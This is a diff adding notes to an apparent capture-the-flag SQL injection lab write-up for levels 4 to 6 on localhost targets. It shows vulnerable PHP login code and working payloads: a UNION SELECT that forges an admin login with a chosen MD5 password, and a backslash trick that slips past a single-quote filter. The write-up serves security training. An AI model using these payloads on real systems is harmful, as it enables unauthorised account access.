@@ -42,3 +42,47 @@
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
     [LEVEL 4]-TARGET: http://localhost:24001/level4.php
+
+    - Here is level4.php:
+
+        $sql = "SELECT username, password FROM users WHERE username='$post_username'";
+            print_r($sql);
+            $query = $database->query($sql);
+            $user = $query->fetch_assoc(); 
+            print_r($user);
+
+            if ($user === NULL)
+                return "Username not found";
+
+            $username = $user["username"];
+            $password = $user["password"];
+            $post_password = md5($post_password);
+    - Use this payload to control admin password in mysql: SELECT username, password FROM users WHERE username='avn' UNION SELECT 'admin', MD5('depzai');
+            => The username will be 'admin' and password is the hash md5 of 'depzai';
+    => Payload: avn' UNION SELECT 'admin', MD5('depzai')#
+    => Wow you can log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}, but how about THIS LEVEL!
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+    [LEVEL 5]-TARGET: http://localhost:24001/level5.php
+
+    - You can't use ' in this level => quite hard.
+
+        function checkValid($data)
+        {
+            if (strpos($data, "'") !== false)
+                return false;
+            return true;
+        }
+
+    => use this trick: 
+    mysql> SELECT username FROM users WHERE username='nhatanh\' AND password=MD5(' UNION SELECT admin;#')
+    => Wow you can log in as admin, here is your flag CBJS{FAKE_FLAG_FAKE_FLAG}, but how about THIS LEVEL!
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+    [LEVEL 6]-TARGET: http://localhost:24001/level6.php
+
+       
+
+
